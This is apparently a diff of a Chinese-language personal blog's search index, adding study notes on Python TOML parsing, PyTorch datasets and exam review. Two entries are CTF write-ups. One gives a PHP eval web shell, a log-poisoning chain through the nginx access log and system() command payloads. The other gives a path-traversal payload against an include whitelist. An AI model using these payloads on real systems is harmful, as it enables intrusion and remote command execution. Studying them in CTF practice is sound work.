         <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>toml配置文件</title>
+    <url>/2025/01/26/toml%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h1 id="toml配置文件"><a href="#toml配置文件" class="headerlink" title="toml配置文件"></a>toml配置文件</h1><h2 id="有关输出的简单例子"><a href="#有关输出的简单例子" class="headerlink" title="有关输出的简单例子:"></a>有关输出的简单例子:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tomllib</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_toml</span>() -&gt; <span class="built_in">dict</span>: </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./config.toml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f: </span><br><span class="line">        toml_data: <span class="built_in">dict</span> = tomllib.load(f)</span><br><span class="line">    <span class="keyword">return</span> toml_data</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    data: <span class="built_in">dict</span> = load_toml()</span><br><span class="line">    pprint(data, sort_dicts=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#解析toml文件并且返回一个字典</span></span><br><span class="line"><span class="comment">#打开toml文件,以只读模式,文件对象赋值给变量f</span></span><br><span class="line"><span class="comment">#箭头和冒号都是注解罢了,不会影响实际函数的运行,只是为了让代码更加易读</span></span><br><span class="line"><span class="comment">#调用tomllib.load()函数,传入文件对象f,解析toml文件,并返回一个字典</span></span><br></pre></td></tr></table></figure>
+
+<p>在该main.py目录下还有另外一个config.toml配置文件,</p>
+<h3 id="函数代码块"><a href="#函数代码块" class="headerlink" title="函数代码块:"></a>函数代码块:</h3><p><code>def load_toml() -&gt; dict:</code>这里是使用箭头进行注释,表明这个函数的返回值是字典,因为,在tomllib库里面,tomllib.load()这个函数对二进制文件进行处理后就是以字典的形式返回的,所以我们要进行注释,解释这个函数的返回值是字典<br><code>toml_data: dict = tomllib.load(f)</code>并且在这个地方,就是给变量赋值的地方,也把这个变量标注为字典</p>
+<h3 id="程序入口"><a href="#程序入口" class="headerlink" title="程序入口"></a>程序入口</h3><p>经过及其简单的启动程序:</p>
+<p><code>if __name__ == &#39;__main__&#39;:</code></p>
+<p>代表程序启动,启动之后就会使用函数,对这个<code>config.toml</code>配置文件进行读取并且以<code>pprint</code>这样美观的方式将其输出。</p>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>toml配置文件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>transformer微调预训练模型</title>
+    <url>/2025/03/03/transformer%E5%BE%AE%E8%B0%83%E9%A2%84%E8%AE%AD%E7%BB%83%E6%A8%A1%E5%9E%8B/</url>
+    <content><![CDATA[<h1 id="transformer微调预训练模型"><a href="#transformer微调预训练模型" class="headerlink" title="transformer微调预训练模型"></a>transformer微调预训练模型</h1><p>先写到前面:</p>
+<ul>
+<li>本文只是对网上transformer学习的文档的注解,并非完整教程</li>
+<li>相关文档链接:<a href="https://transformers.run/">transformer快速入门教程</a></li>
+</ul>
+<h2 id="1-加载数据集"><a href="#1-加载数据集" class="headerlink" title="1. 加载数据集"></a>1. 加载数据集</h2><ul>
+<li>这里我主要是想要搞清楚魔术方法的问题:</li>
+</ul>
+<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念:"></a>基本概念:</h3><ul>
+<li>定义:在 Python 中，以双下划线开头和结尾的方法（例如 <code>__xxx__</code>）被称为特殊方法（也称为魔术方法或 dunder 方法，“dunder” 是 “double underscore” 的缩写）。</li>
+<li><strong>Python 解释器自动调用(特殊性质)</strong>：特殊方法会在特定的操作或事件发生时被 Python 解释器自动调用，而不需要显式地调用这些方法。例如，当使用 <code>len()</code> 函数时，Python 解释器会自动调用对象的 <code>__len__</code> 方法；当使用索引访问对象（如 <code>obj[index]</code>）时，会自动调用对象的 <code>__getitem__</code> 方法。</li>
+</ul>
+<h3 id="关于除了-init-方法以外的其他方法的调用"><a href="#关于除了-init-方法以外的其他方法的调用" class="headerlink" title="关于除了__init__方法以外的其他方法的调用:"></a>关于除了<code>__init__</code>方法以外的其他方法的调用:</h3><p><code>__getitem__</code> 方法在索引访问时被调用的原理</p>
+<p>Python 为了实现统一且灵活的对象操作方式，定义了一系列的特殊方法（魔术方法）。这些特殊方法允许自定义类的对象表现得像 Python 内置的数据类型（如列表、字典等）一样。</p>
+<p>当你使用 <code>obj[index]</code> 这种索引访问语法时，Python 解释器会自动查找 <code>obj</code> 对象是否实现了 <code>__getitem__</code> 方法。如果实现了，就会调用该方法并将 <code>index</code> 作为参数传递给它。这是 Python 语言的一种约定和机制，通过这种方式，你可以让自定义类支持索引访问操作。</p>
+<p>以下是一个简单的示例:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyList</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="variable language_">self</span>.data = data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, index</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;__getitem__ 方法被调用，索引为 <span class="subst">&#123;index&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.data[index]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 MyList 类的实例</span></span><br><span class="line">my_list = MyList([<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用索引访问操作，会触发 __getitem__ 方法</span></span><br><span class="line">result = my_list[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，当执行 <code>my_list[1]</code> 时，Python 解释器检测到 <code>my_list</code> 对象实现了 <code>__getitem__</code> 方法，就会自动调用该方法，并将 <code>1</code> 作为参数传递给它。</p>
+<ul>
+<li>对于我们要学习的<code>Dataset</code>类,</li>
+</ul>
+<h3 id="关于Dataset类的基本使用流程"><a href="#关于Dataset类的基本使用流程" class="headerlink" title="关于Dataset类的基本使用流程:"></a>关于<code>Dataset</code>类的基本使用流程:</h3><h4 id="1-导入必要的库"><a href="#1-导入必要的库" class="headerlink" title="1. 导入必要的库"></a>1. 导入必要的库</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> Dataset</span><br><span class="line"><span class="keyword">import</span> json</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>torch.utils.data.Dataset</code>：这是 PyTorch 中用于表示数据集的抽象基类，自定义的数据集类通常需要继承这个类，以便能够使用 PyTorch 提供的数据集处理和数据加载工具。</li>
+<li><code>json</code>：Python 标准库中的 <code>json</code> 模块，用于处理 JSON 格式的数据。</li>
+</ul>
+<h4 id="2-定义自定义数据集类-AFQMC"><a href="#2-定义自定义数据集类-AFQMC" class="headerlink" title="2. 定义自定义数据集类 AFQMC"></a>2. 定义自定义数据集类 <code>AFQMC</code></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AFQMC</span>(<span class="title class_ inherited__">Dataset</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data_file</span>):</span><br><span class="line">        <span class="variable language_">self</span>.data = <span class="variable language_">self</span>.load_data(data_file)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>AFQMC</code> 类继承自 <code>Dataset</code> 类。</li>
+<li><code>__init__</code> 方法是类的构造函数，在创建 <code>AFQMC</code> 类的实例时会被调用。它接收一个参数 <code>data_file</code>，表示数据文件的路径。在方法内部，调用了 <code>self.load_data(data_file)</code> 方法来加载数据，并将加载的数据存储在 <code>self.data</code> 中。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_data</span>(<span class="params">self, data_file</span>):</span><br><span class="line">    Data = &#123;&#125;</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(data_file, <span class="string">&#x27;rt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> idx, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(f):</span><br><span class="line">            sample = json.loads(line.strip())</span><br><span class="line">            Data[idx] = sample</span><br><span class="line">    <span class="keyword">return</span> Data</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>load_data</code> 方法是自定义的方法，用于从指定的 JSON 文件中加载数据。</li>
+<li>它首先创建一个空字典 <code>Data</code>，然后逐行读取文件。对于每一行，使用 <code>json.loads</code> 方法将其解析为 JSON 对象，并将其存储在字典 <code>Data</code> 中，键为行索引 <code>idx</code>。</li>
+<li>最后返回加载好的数据字典。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.data)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>__len__</code> 方法是必须实现的方法，它返回数据集的长度，即数据样本的数量。在这个例子中，返回的是 <code>self.data</code> 字典的长度。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, idx</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span>.data[idx]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>__getitem__</code> 方法也是必须实现的方法，它用于根据给定的索引 <code>idx</code> 从数据集中获取一个样本。在这个例子中，直接从 <code>self.data</code> 字典中获取对应索引的样本并返回。</li>
+</ul>
+<h4 id="3-创建数据集实例并打印样本"><a href="#3-创建数据集实例并打印样本" class="headerlink" title="3. 创建数据集实例并打印样本"></a>3. 创建数据集实例并打印样本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">train_data = AFQMC(<span class="string">&#x27;data/afqmc_public/train.json&#x27;</span>)</span><br><span class="line">valid_data = AFQMC(<span class="string">&#x27;data/afqmc_public/dev.json&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(train_data[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>创建了两个 <code>AFQMC</code> 类的实例 <code>train_data</code> 和 <code>valid_data</code>，分别加载训练集和验证集的数据。</li>
+<li>打印训练集的第一个样本。</li>
+</ul>
+<h3 id="Dataset-在数据微调中的作用"><a href="#Dataset-在数据微调中的作用" class="headerlink" title="Dataset 在数据微调中的作用"></a><code>Dataset</code> 在数据微调中的作用</h3><p>在深度学习模型微调（fine-tuning）过程中，<code>Dataset</code> 类起着至关重要的作用：</p>
+<ul>
+<li><strong>数据组织</strong>：<code>Dataset</code> 类可以将原始数据（如文本、图像等）组织成模型可以处理的格式。通过自定义 <code>__getitem__</code> 方法，可以灵活地对数据进行预处理，如分词、编码等。</li>
+<li><strong>数据加载</strong>：<code>Dataset</code> 类可以与 <code>DataLoader</code> 类配合使用，实现数据的批量加载和并行处理。<code>DataLoader</code> 可以根据需要对数据进行打乱、分批等操作，提高数据加载的效率。</li>
+<li><strong>代码复用</strong>：自定义的 <code>Dataset</code> 类可以在不同的实验和项目中复用，方便对数据进行统一管理和处理。</li>
+</ul>
+<h3 id="Dataset-继承的方法体现"><a href="#Dataset-继承的方法体现" class="headerlink" title="Dataset 继承的方法体现"></a><code>Dataset</code> 继承的方法体现</h3><p><code>AFQMC</code> 类继承自 <code>Dataset</code> 类，虽然 <code>Dataset</code> 是一个抽象基类，没有具体的实现代码，但它定义了一些必须实现的方法，这些方法在 <code>AFQMC</code> 类中得到了具体实现：</p>
+<ul>
+<li><code>__len__</code> 方法：用于返回数据集的长度。在使用 <code>DataLoader</code> 加载数据时，<code>DataLoader</code> 会调用这个方法来确定数据集的大小。</li>
+<li><code>__getitem__</code> 方法：用于根据索引获取数据集中的一个样本。<code>DataLoader</code> 在加载数据时，会通过这个方法逐批获取数据。</li>
+</ul>
+<p>通过实现这两个方法，<code>AFQMC</code> 类就符合了 <code>Dataset</code> 类的接口规范，可以与 PyTorch 提供的其他数据处理和模型训练工具无缝集成。</p>
+<h3 id="Dataset和Dataloader类之间的配合"><a href="#Dataset和Dataloader类之间的配合" class="headerlink" title="Dataset和Dataloader类之间的配合:"></a><code>Dataset</code>和<code>Dataloader</code>类之间的配合:</h3><p><code>DataLoader</code> 是 PyTorch 中用于批量加载数据的工具，它与自定义的 <code>Dataset</code> 类（如 <code>LawDataset</code>）紧密配合，以高效地为模型训练或推理提供数据。具体的配合过程如下：</p>
+<h4 id="1-初始化阶段"><a href="#1-初始化阶段" class="headerlink" title="1. 初始化阶段"></a>1. 初始化阶段</h4><p>当你创建 <code>DataLoader</code> 实例时，需要将 <code>Dataset</code> 实例作为参数传入，例如：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"><span class="comment"># 假设已经定义了 LawDataset 类并创建了 dataset 实例</span></span><br><span class="line">dataloader = DataLoader(dataset, batch_size=<span class="number">2</span>, shuffle=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里的 <code>batch_size</code> 表示每个批次包含的样本数量，<code>shuffle</code> 表示是否在每个 epoch 开始时打乱数据集。</p>
+<h4 id="2-数据加载阶段"><a href="#2-数据加载阶段" class="headerlink" title="2. 数据加载阶段"></a>2. 数据加载阶段</h4><p>当你使用 <code>for</code> 循环遍历 <code>DataLoader</code> 时，<code>DataLoader</code> 会根据 <code>batch_size</code> 的设置，多次调用 <code>Dataset</code> 类的 <code>__getitem__</code> 方法来获取样本。具体步骤如下：</p>
+<ul>
+<li><code>DataLoader</code> 首先会确定当前批次需要获取的样本索引。</li>
+<li>对于每个索引，<code>DataLoader</code> 会调用 <code>Dataset</code> 实例的 <code>__getitem__</code> 方法，传入该索引，从而获取对应的样本。</li>
+<li>当获取到 <code>batch_size</code> 个样本后，<code>DataLoader</code> 会将这些样本组合成一个批次，并将其返回给循环。</li>
+</ul>
+<p>例如，当 <code>batch_size = 2</code> 时，<code>DataLoader</code> 会先调用 <code>__getitem__(0)</code> 得到第一个样本，再调用 <code>__getitem__(1)</code> 得到第二个样本，然后将这两个样本组合成一个批次。</p>
+<p><strong>补充几点:</strong></p>
+<h3 id="getitem-方法每次只处理一个文本的原因"><a href="#getitem-方法每次只处理一个文本的原因" class="headerlink" title="__getitem__ 方法每次只处理一个文本的原因"></a><code>__getitem__</code> 方法每次只处理一个文本的原因</h3><p><code>__getitem__</code> 方法设计为每次只处理一个索引对应的文本，这是为了保证代码的简洁性和灵活性。通过将数据处理逻辑封装在 <code>__getitem__</code> 方法中，<code>DataLoader</code> 可以根据需要多次调用该方法，从而实现批量数据的加载。如果 <code>__getitem__</code> 方法要处理多个文本，会增加方法的复杂度，并且不利于数据的随机访问和批量处理。</p>
+<h3 id="getitem-方法中-self-texts-idx-的调用逻辑"><a href="#getitem-方法中-self-texts-idx-的调用逻辑" class="headerlink" title="__getitem__ 方法中 self.texts[idx] 的调用逻辑"></a><code>__getitem__</code> 方法中 <code>self.texts[idx]</code> 的调用逻辑</h3><p>在 <code>__getitem__</code> 方法中，<code>self.texts[idx]</code> 只是获取 <code>self.texts</code> 列表中索引为 <code>idx</code> 的文本元素，它本身并不会触发整个 <code>__getitem__</code> 方法。<code>__getitem__</code> 方法是在 <code>DataLoader</code> 调用时被触发的，<code>DataLoader</code> 会传入一个索引 <code>idx</code>，然后执行 <code>__getitem__</code> 方法中的代码，<code>self.texts[idx]</code> 只是 <code>__getitem__</code> 方法中的一个操作步骤。</p>
+<p>以下是一个简单的示例代码，展示了 <code>DataLoader</code> 与 <code>Dataset</code> 类的配合过程：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> Dataset, DataLoader</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyDataset</span>(<span class="title class_ inherited__">Dataset</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="variable language_">self</span>.data = data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, idx</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Getting item at index <span class="subst">&#123;idx&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.data[idx]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例数据</span></span><br><span class="line">data = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">dataset = MyDataset(data)</span><br><span class="line">dataloader = DataLoader(dataset, batch_size=<span class="number">2</span>, shuffle=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> batch <span class="keyword">in</span> dataloader:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Batch: <span class="subst">&#123;batch&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在这个示例中，<code>DataLoader</code> 每次会调用 <code>MyDataset</code> 的 <code>__getitem__</code> 方法两次（因为 <code>batch_size = 2</code>），获取两个样本并组合成一个批次，然后将批次返回给循环进行处理。</p>
+<p>综上所述，<code>DataLoader</code> 通过多次调用 <code>Dataset</code> 类的 <code>__getitem__</code> 方法来实现批量数据的加载，而 <code>__getitem__</code> 方法每次只处理一个索引对应的样本，保证了代码的简洁性和灵活性。</p>
+]]></content>
+      <categories>
+        <category>ai</category>
+      </categories>
+      <tags>
+        <tag>transformer</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>一句话木马简单例题web80</title>
+    <url>/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
+    <content><![CDATA[<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h4><p>这道题把协议也过滤,比如说php,data协议,所以我们可以使用一句话协议木马,比如:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="木马分析："><a href="#木马分析：" class="headerlink" title="木马分析："></a>木马分析：</h4><h5 id="插入位置"><a href="#插入位置" class="headerlink" title="插入位置:"></a>插入位置:</h5><p>1.首先，我们需要知道日志的位置,日志文件根据服务器的配置不同,先要了解服务器是nginx还是apache,然后再去查看日志文件位置。<br>payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p>可以发现回显<br>2.然后通过nginx日志默认路径打开日志文件:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<p>3.将payloads写入日志文件:<br>为什么要在UA(user-agent)中写入payloads?因为UA是浏览器的标识符,方便隐藏。<br>如图:</p>
+<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image.png" class="" title="image">
+
+<h5 id="url中远程文件包含触发"><a href="#url中远程文件包含触发" class="headerlink" title="url中远程文件包含触发:"></a>url中远程文件包含触发:</h5><p>写入payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;1=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
+<p>先调出文件:</p>
+<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-1.png" class="" title="image-1">
+
+<p>然后再查看日志文件:<br>写入payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;1=system(&quot;cat fl0g.php&quot;);</span><br></pre></td></tr></table></figure>
+<p>嘻嘻,其实不行,要用URL编码:就是要把cat fl0g.php进行编码才可以,<br>这里存疑,为什么要用URL编码?之前system(“ls”)不用编码,为什么这里要编码?<br>应该写作：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log&amp;1=system(%22cat%20fl0g.php%22)%3</span><br></pre></td></tr></table></figure>
+<p>才可以利用repeater回显:</p>
+<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-1-1736824226811-3-1736824231038-5.png" class="" title="image-1">
+
+<p><strong>这个点还是需要解决!</strong><br>我现在传参还是优先用URL编码传参罢</p>
+]]></content>
+      <categories>
+        <category>ctfshow web</category>
+      </categories>
+      <tags>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>二级通识</title>
+    <url>/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/</url>
+    <content><![CDATA[<h1 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h1><h2 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h2><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250319131007896.png" class="" title="image-20250319131007896">
+
+<ul>
+<li><p>解析:</p>
+</li>
+<li><p>咱把循环队列想象成一个头尾相连的环形跑道，跑道上有一些位置能放东西。队头指针 <code>front</code> 就像是在跑道上标记从哪儿开始取东西，队尾指针 <code>rear</code> 标记着下一个能放东西的位置。</p>
+<p>一般来说，要是队头和队尾都在跑道的最后一个位置（也就是 <code>front = rear = m</code> ，这里 <code>m</code> 是跑道总共能放东西的位置数量 ），那就说明跑道上啥东西都没有，队列是空的。</p>
+<p>但要是队头和队尾在同一个位置，可又不是跑道最后那个位置（像这题里 <code>front = rear = 25</code> ，不是 50 ），这时候队列可能是空的，也可能是摆满东西了。</p>
+<p>这题说又成功放进去一个东西，要是队列已经摆满了，就没地方放新东西了，所以就说明之前队列是空的。那放进去一个东西后，队列里自然就只有这 1 个东西啦，答案就是 A 选项。</p>
+</li>
+</ul>
+<h1 id="栈和队列"><a href="#栈和队列" class="headerlink" title="栈和队列"></a>栈和队列</h1><h2 id="做题注意"><a href="#做题注意" class="headerlink" title="做题注意"></a>做题注意</h2><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250319180642957.png" class="" title="image-20250319180642957">
+
+<ul>
+<li>这题玩文字游戏：这里说的是<strong>轮流</strong>进入&#x2F;出栈，<strong>轮流</strong>进入&#x2F;退队，所以逻辑是<code>A,C,E,G</code>入栈，<code>B,D,F,H</code>入队，出栈和出队也是这个顺序。</li>
+</ul>
+<h1 id="程序化结构"><a href="#程序化结构" class="headerlink" title="程序化结构"></a>程序化结构</h1><h2 id="结构化程序的基本控制结构"><a href="#结构化程序的基本控制结构" class="headerlink" title="结构化程序的基本控制结构"></a>结构化程序的基本控制结构</h2><ul>
+<li>顺序，选择和重复。</li>
+</ul>
+<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h2 id="关系数据库"><a href="#关系数据库" class="headerlink" title="关系数据库"></a>关系数据库</h2><ul>
+<li>关系模式是用来记录用户数据的<code>二维表</code>。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>计算机基础</category>
+      </categories>
+      <tags>
+        <tag>计算机基础</tag>
       </tags>
   </entry>
   <entry>
@@ -2228,6 +2422,28 @@ int main()&#123;
       </tags>
   </entry>
   <entry>
+    <title>代码审计套路</title>
+    <url>/2025/01/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A5%97%E8%B7%AF/</url>
+    <content><![CDATA[<h3 id="代码审计的一些套路总结"><a href="#代码审计的一些套路总结" class="headerlink" title="代码审计的一些套路总结"></a>代码审计的一些套路总结</h3><h4 id="buuctf-HCTF-2018-WarmUp-strpos-substr截取代码"><a href="#buuctf-HCTF-2018-WarmUp-strpos-substr截取代码" class="headerlink" title="[buuctf] [HCTF 2018]WarmUp strpos&#x2F;substr截取代码"></a>[buuctf] [HCTF 2018]WarmUp strpos&#x2F;substr截取代码</h4><p>首先来看源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">&amp;<span class="variable">$_page</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>特别注意的点就是:</strong><br>这里substr截取代码时的第三个参数是截取代码的长度,第二个参数是开始的长度<br>而巧妙之处就在于:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;?&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>这段代码将page手动加了一个?然后探测?的位置,而在主流编程语言中,字符串位置的参数都是从0开始的,例如我要探测:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mmk&amp;nina?</span><br></pre></td></tr></table></figure>
+<p>这里?的位置在参数8的位置,而截取的时候,长度是8,所以刚好把?前面的截取走了,并没有包含?<br>这里就可以解释为什么buuctf那道题的payloads为:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=hint.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<p>为什么本应是..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg,还在前面多加了一个&#x2F;,因为函数把?前面的字符全部截取走了,只剩下?和前面多加的&#x2F;以及后面的路径: ..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag,这里的&#x2F;是include的分割符号</p>
+<p><strong>详细见[HCTF 2018]WarmUp1</strong>的wp。</p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>决策树分类算法学习</title>
     <url>/2025/03/01/%E5%86%B3%E7%AD%96%E6%A0%91%E5%88%86%E7%B1%BB%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="决策树分类算法学习"><a href="#决策树分类算法学习" class="headerlink" title="决策树分类算法学习"></a>决策树分类算法学习</h1><h2 id="XGBoost算法及其应用"><a href="#XGBoost算法及其应用" class="headerlink" title="XGBoost算法及其应用"></a>XGBoost算法及其应用</h2><h3 id="对于模型的保存"><a href="#对于模型的保存" class="headerlink" title="对于模型的保存"></a>对于模型的保存</h3><ul>
@@ -2263,59 +2479,20 @@ class ContextAwareClassifier:
       </tags>
   </entry>
   <entry>
-    <title>一句话木马简单例题web80</title>
-    <url>/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
